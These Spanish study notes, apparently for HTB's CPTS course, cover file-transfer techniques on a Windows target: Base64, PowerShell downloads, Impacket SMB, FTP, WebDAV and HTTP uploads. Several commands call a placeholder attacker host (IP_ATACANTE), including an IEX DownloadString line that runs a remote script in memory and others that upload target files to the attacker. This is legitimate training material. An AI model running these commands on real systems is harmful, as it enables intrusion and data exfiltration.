
## 1. Introducción

En Windows podemos transferir archivos utilizando herramientas nativas del sistema, sin necesidad de instalar programas adicionales.

Los métodos principales de esta sección son:

- Base64 mediante PowerShell.
    
- Descargas HTTP/HTTPS mediante PowerShell.
    
- Transferencias SMB con Impacket.
    
- Transferencias FTP.
    
- Transferencias WebDAV.
    

La elección del método depende de:

- Los protocolos permitidos por el firewall.
    
- Las herramientas disponibles en el sistema.
    
- Los permisos del usuario.
    
- El tamaño del archivo.
    
- La posibilidad de ejecutar comandos interactivos.

# 2. Transferencia mediante Base64

Permite transferir archivos convirtiéndolos en texto. No necesita establecer una conexión de red entre las máquinas, pero requiere copiar la cadena entre ambas terminales.

Es útil para archivos pequeños cuando no disponemos de otros métodos de transferencia.

## 2.1. Descargar un archivo desde Kali y reconstruirlo en Windows

### En Kali: calcular el hash original

```
md5sum archivo
```

### En Kali: codificar el archivo

```
cat archivo | base64 -w 0; echo
```

- `base64`: codifica el archivo.
    
- `-w 0`: evita los saltos de línea en la salida.
    

Copia la cadena generada.

### En Windows PowerShell: decodificar y guardar el archivo

```
[IO.File]::WriteAllBytes(
    "C:\Users\Public\archivo",
    [Convert]::FromBase64String("CADENA_BASE64")
)
```

Sustituye `CADENA_BASE64` por el contenido copiado y modifica la ruta de destino según tus necesidades.

### En Windows: comprobar el hash

```
Get-FileHash C:\Users\Public\archivo -Algorithm MD5
```

El hash debe coincidir con el calculado en Kali.

## 2.2. Subir un archivo desde Windows a Kali

### En Windows PowerShell: codificar el archivo

```
[Convert]::ToBase64String(
    (Get-Content -Path "C:\ruta\archivo" -Encoding Byte)
)
```

Copia la cadena Base64 resultante.

### En Kali: reconstruir el archivo

```
echo 'CADENA_BASE64' | base64 -d > archivo
```

### En Kali: verificar la integridad

```
md5sum archivo
```

Compara el resultado con el hash obtenido en Windows.

### Limitaciones de Base64

- Aumenta el tamaño del archivo aproximadamente un 33 %.
    
- Las cadenas grandes pueden provocar errores al copiarlas o pegarlas.
    
- `cmd.exe` tiene un límite de longitud de línea de comandos de 8191 caracteres.
    
- Algunas web shells tampoco permiten manejar cadenas demasiado largas.
    

**Cuándo utilizarlo:** archivos pequeños cuando no existe una conexión de transferencia adecuada.

# 3. Descargas HTTP/HTTPS mediante PowerShell

PowerShell dispone de diferentes métodos para descargar archivos desde un servidor web.

## 3.1. Descargar mediante `Net.WebClient.DownloadFile`

```
(New-Object Net.WebClient).DownloadFile(
    'http://IP_ATACANTE/archivo',
    'C:\Users\Public\archivo'
)
```

Descarga el archivo y lo guarda en la ruta especificada.

También existe la versión asíncrona:

```
(New-Object Net.WebClient).DownloadFileAsync(
    'http://IP_ATACANTE/archivo',
    'C:\Users\Public\archivo'
)
```

## 3.2. Descargar mediante `Invoke-WebRequest`

```
Invoke-WebRequest `
    -Uri 'http://IP_ATACANTE/archivo' `
    -OutFile 'C:\Users\Public\archivo'
```

También puedes utilizar los alias:

```
iwr
curl
wget
```

En PowerShell, estos nombres pueden ser alias de `Invoke-WebRequest`, por lo que no debes asumir que `curl` o `wget` ejecutan necesariamente las utilidades habituales de Linux.

## 3.3. Ejecutar un script directamente en memoria

PowerShell permite descargar el contenido de un recurso y pasarlo a `Invoke-Expression` (`IEX`), sin guardarlo primero como archivo.

Ejemplo ilustrativo:

```
IEX (New-Object Net.WebClient).DownloadString(
    'http://IP_ATACANTE/script.ps1'
)
```

También puede utilizarse una tubería:

```
(New-Object Net.WebClient).DownloadString(
    'http://IP_ATACANTE/script.ps1'
) | IEX
```

Esto se conoce habitualmente como ejecución _fileless_ porque el script puede ejecutarse directamente en memoria.

**Importante:** ejecutar código directamente en memoria no significa que no deje rastros. Puede generar actividad de red, registros de PowerShell y otras evidencias.

## 3.4. Errores comunes de PowerShell

### Error relacionado con Internet Explorer

En determinadas versiones antiguas de PowerShell, `Invoke-WebRequest` puede fallar porque el motor de Internet Explorer no está disponible o no se ha completado su configuración inicial.

En esos entornos, prueba:

```
Invoke-WebRequest `
    -Uri 'http://IP_ATACANTE/archivo' `
    -OutFile 'archivo' `
    -UseBasicParsing
```

### Error de confianza SSL/TLS

Una descarga HTTPS puede fallar si el certificado del servidor no es de confianza.

Antes de modificar la validación de certificados, comprueba el certificado y la causa del error. Desactivar su validación reduce la seguridad de la conexión y no debería ser la solución predeterminada.

# 4. Transferencias SMB

SMB permite compartir archivos a través de la red. En Windows se utiliza habitualmente mediante recursos compartidos y conexiones al puerto TCP/445.

En HTB podemos crear un servidor SMB en Kali utilizando Impacket.

## 4.1. Crear un servidor SMB en Kali

```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

- `share`: nombre del recurso compartido.
    
- `-smb2support`: habilita la compatibilidad con SMB2.
    
- `/tmp/smbshare`: directorio local que se comparte.
    

Coloca previamente el archivo que quieras transferir dentro de `/tmp/smbshare`.

## 4.2. Descargar desde SMB en Windows

Desde CMD:

```
copy \\IP_ATACANTE\share\archivo.exe C:\Users\Public\archivo.exe
```

Desde PowerShell:

```
Copy-Item '\\IP_ATACANTE\share\archivo.exe' 'C:\Users\Public\archivo.exe'
```

Sustituye `IP_ATACANTE` por la dirección IP de tu máquina Kali accesible desde el objetivo.

## 4.3. Problema con el acceso de invitado

Las versiones modernas de Windows pueden bloquear las conexiones SMB con acceso de invitado no autenticado.

Si ocurre, puedes configurar un recurso compartido autenticado en Kali:

```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Después, desde Windows, establece la conexión:

```
net use N: \\IP_ATACANTE\share /user:test test
```

Y copia el archivo:

```
copy N:\archivo.exe C:\Users\Public\archivo.exe
```

Si necesitas desconectar el recurso:

```
net use N: /delete
```

**Cuándo utilizar SMB:** cuando existe conectividad TCP/445 entre Windows y Kali y el acceso al recurso compartido está permitido.

# 5. Transferencias FTP

FTP permite descargar y subir archivos mediante un servidor FTP.

En la configuración tradicional, utiliza TCP/21 para el canal de control y puede utilizar TCP/20 para el canal de datos en modo activo. En modo pasivo, los puertos de datos dependen de la configuración del servidor.

## 5.1. Crear un servidor FTP en Kali

Instala la biblioteca necesaria:

```
sudo pip3 install pyftpdlib
```

Inicia el servidor en el puerto 21:

```
sudo python3 -m pyftpdlib --port 21
```

Por defecto, el servidor puede permitir acceso anónimo de lectura.

## 5.2. Descargar un archivo mediante PowerShell

```
(New-Object Net.WebClient).DownloadFile(
    'ftp://IP_ATACANTE/archivo.txt',
    'C:\Users\Public\archivo.txt'
)
```

## 5.3. Descargar mediante el cliente FTP de Windows

Si la shell no es interactiva, puedes crear un archivo de comandos para el cliente FTP.

### Crear el archivo de comandos

```
echo open IP_ATACANTE > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET archivo.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
```

### Ejecutar los comandos

```
ftp -v -n -s:ftpcommand.txt
```

El cliente FTP procesa las instrucciones del archivo.

## 5.4. Subir archivos desde Windows a Kali

Para permitir subidas, inicia el servidor FTP con la opción `--write`:

```
sudo python3 -m pyftpdlib --port 21 --write
```

Después, desde PowerShell:

```
(New-Object Net.WebClient).UploadFile(
    'ftp://IP_ATACANTE/archivo.txt',
    'C:\ruta\archivo.txt'
)
```

También puedes utilizar un archivo de comandos FTP.

```
echo open IP_ATACANTE > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT C:\ruta\archivo.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
```

Ejecuta:

```
ftp -v -n -s:ftpcommand.txt
```

**Importante:** el modo anónimo con permisos de escritura es inseguro. Utilízalo únicamente en tu laboratorio y limita el acceso al servidor.

# 6. Transferencias WebDAV

WebDAV es una extensión de HTTP que permite utilizar un servidor web como un recurso compartido de archivos.

Puede ser útil cuando SMB está bloqueado, pero existe conectividad HTTP o HTTPS.

## 6.1. Instalar las dependencias en Kali

```
sudo pip3 install wsgidav cheroot
```

## 6.2. Iniciar el servidor WebDAV

Para compartir `/tmp` con permisos de escritura en un laboratorio:

```
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

- `--host=0.0.0.0`: escucha en todas las interfaces IPv4.
    
- `--port=80`: utiliza el puerto 80.
    
- `--root=/tmp`: publica el directorio indicado.
    
- `--auth=anonymous`: permite acceso anónimo según la configuración del servidor.
    

**Precaución:** esta configuración permite acceso anónimo y puede permitir modificaciones en los archivos compartidos. No la expongas a redes no confiables.

## 6.3. Acceder al recurso desde Windows

Para listar su contenido:

```
dir \\IP_ATACANTE\DavWWWRoot
```

`DavWWWRoot` es una palabra clave especial del redireccionador WebDAV de Windows que representa la raíz del servidor WebDAV.

## 6.4. Descargar un archivo desde WebDAV

```
copy \\IP_ATACANTE\DavWWWRoot\archivo.txt C:\Users\Public\archivo.txt
```

## 6.5. Subir un archivo a WebDAV

```
copy C:\Users\Public\archivo.txt \\IP_ATACANTE\DavWWWRoot\
```

Para que funcione, el servidor debe permitir escrituras y la conectividad debe estar disponible.

# 7. Subidas HTTP desde Windows

En ocasiones necesitamos transferir un archivo desde Windows hacia nuestra máquina Kali.

HTB muestra dos métodos: utilizar un servidor web que acepte subidas o enviar el contenido codificado en Base64.

## 7.1. Crear un servidor HTTP que acepte subidas

En Kali:

```
pip3 install uploadserver
```

Inicia el servidor:

```
python3 -m uploadserver
```

El ejemplo de HTB utiliza el puerto 8000 y el endpoint `/upload`.

## 7.2. Subir un archivo mediante PowerShell

El material utiliza el script `PSUpload.ps1`, que define la función `Invoke-FileUpload`.

Una vez que el script está disponible en el sistema:

```
Invoke-FileUpload `
    -Uri 'http://IP_ATACANTE:8000/upload' `
    -File 'C:\ruta\archivo.txt'
```

El servidor recibe el archivo y el script muestra información sobre la transferencia.

**Nota:** `Invoke-FileUpload` no es un cmdlet nativo de PowerShell; es una función definida por el script.

## 7.3. Subir archivos como Base64 mediante HTTP

En Windows, puedes convertir un archivo a Base64:

```
$b64 = [System.Convert]::ToBase64String(
    (Get-Content -Path 'C:\ruta\archivo.txt' -Encoding Byte)
)
```

Después, el contenido se puede enviar mediante una petición HTTP POST a un servidor preparado para recibirlo.

En Kali, el contenido recibido puede decodificarse con:

```
echo 'CADENA_BASE64' | base64 -d > archivo.txt
```

Este método necesita que el receptor procese correctamente el cuerpo de la petición. Un servidor HTTP genérico o Netcat no reconstruye automáticamente el archivo a partir de cualquier solicitud POST.

# 8. Comparativa de métodos

|Método|Dirección|Ventaja principal|Limitación principal|
|---|---|---|---|
|Base64|Subida y descarga|No necesita una conexión de transferencia directa|Poco práctico para archivos grandes|
|HTTP/HTTPS|Principalmente descarga en los ejemplos|Suele aprovechar conectividad web existente|Puede haber filtrado o restricciones de certificados|
|SMB|Subida y descarga|Transferencias sencillas mediante recursos compartidos|TCP/445 puede estar bloqueado|
|FTP|Subida y descarga|Cliente disponible en muchos sistemas Windows|Puede estar bloqueado y requiere configurar el servidor|
|WebDAV|Subida y descarga|Permite acceder a archivos mediante HTTP|Requiere configurar un servidor WebDAV|
|HTTP POST|Subida|Útil cuando se dispone de un receptor HTTP|El servidor debe aceptar y procesar la subida|

# 9. Errores y comprobaciones importantes

Antes de cambiar de método, comprueba:

### Conectividad

En Windows:

```
Test-NetConnection IP_ATACANTE -Port 80
Test-NetConnection IP_ATACANTE -Port 445
Test-NetConnection IP_ATACANTE -Port 21
```

Sustituye la IP y los puertos por los correspondientes al servidor que hayas iniciado.

### Dirección IP correcta

Comprueba la IP de la interfaz de Kali conectada a la VPN de HTB:

```
ip -br addr
```

No utilices una dirección de la interfaz equivocada, como la IP de una red local que el objetivo no pueda alcanzar.

### Servidor escuchando

En Kali:

```
sudo ss -lntp
```

Comprueba que el servicio esté escuchando en el puerto esperado.

### Integridad del archivo

Cuando transfieras archivos importantes, compara los hashes de origen y destino.

En Kali:

```
md5sum archivo
```

En Windows:

```
Get-FileHash C:\ruta\archivo -Algorithm MD5
```

Los hashes deben coincidir. MD5 sirve para comprobar que el contenido se ha transferido sin cambios accidentales, aunque no es adecuado para verificar autenticidad frente a un atacante.

## 11. Chuleta rápida

### Base64

```
# Kali: codificar
base64 -w 0 archivo

# Kali: decodificar
base64 -d archivo.b64 > archivo
```

```
# Windows: decodificar
[IO.File]::WriteAllBytes("C:\ruta\archivo", [Convert]::FromBase64String("CADENA_BASE64"))

# Windows: comprobar hash
Get-FileHash C:\ruta\archivo -Algorithm MD5
```

### HTTP

```
# Descargar archivo
(New-Object Net.WebClient).DownloadFile('http://IP_ATACANTE/archivo', 'C:\ruta\archivo')

# Descargar contenido de texto
(New-Object Net.WebClient).DownloadString('http://IP_ATACANTE/script.ps1')

# Invoke-WebRequest
iwr http://IP_ATACANTE/archivo -OutFile C:\ruta\archivo
```

### SMB

```
# Kali
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

```
:: Windows
copy \\IP_ATACANTE\share\archivo C:\ruta\archivo
```

### FTP

```
# Kali: descargar
sudo python3 -m pyftpdlib --port 21

# Kali: permitir subidas
sudo python3 -m pyftpdlib --port 21 --write
```

```
# Windows: descargar
(New-Object Net.WebClient).DownloadFile('ftp://IP_ATACANTE/archivo', 'C:\ruta\archivo')

# Windows: subir
(New-Object Net.WebClient).UploadFile('ftp://IP_ATACANTE/archivo', 'C:\ruta\archivo')
```

### WebDAV

```
# Kali
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```
:: Windows: listar
dir \\IP_ATACANTE\DavWWWRoot

:: Windows: descargar
copy \\IP_ATACANTE\DavWWWRoot\archivo C:\ruta\archivo

:: Windows: subir
copy C:\ruta\archivo \\IP_ATACANTE\DavWWWRoot\
```

## Ideas clave para el CPTS

- **Base64:** alternativa para archivos pequeños cuando copiar texto es más sencillo que establecer una conexión de red.
    
- **PowerShell** `**DownloadFile**`**:** descarga un archivo a una ruta local.
    
- **PowerShell** `**DownloadString**` **+** `**IEX**`**:** puede ejecutar un script directamente en memoria.
    
- **SMB:** comprueba el puerto TCP/445 y las restricciones de acceso de invitado.
    
- **FTP:** recuerda que las subidas requieren permisos de escritura en el servidor.
    
- **WebDAV:** utiliza `DavWWWRoot` para acceder a la raíz del recurso desde Windows.
    
- **Verifica los hashes** cuando necesites confirmar la integridad de una transferencia.
    
- **Adapta el método al entorno:** la conectividad, los permisos y las herramientas disponibles determinan qué opción resulta viable.
